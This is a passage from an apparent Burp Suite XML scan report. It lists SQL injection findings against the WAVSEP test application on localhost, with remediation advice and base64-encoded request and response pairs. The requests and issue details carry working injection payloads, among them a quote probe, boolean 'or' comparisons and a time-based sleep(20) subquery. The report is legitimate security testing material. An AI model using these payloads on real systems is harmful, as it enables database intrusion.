      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjEwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6431915716600600576</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>14963268 or 9114=09114</b> and <b>48556194 or 3479=3488</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MSc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo1MSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MTE0OTYzMjY4JTIwb3IlMjA5MTE0JTNkMDkxMTQ=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MTQ4NTU2MTk0JTIwb3IlMjAzNDc5JTNkMzQ4OA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjEyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5177017460594084864</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
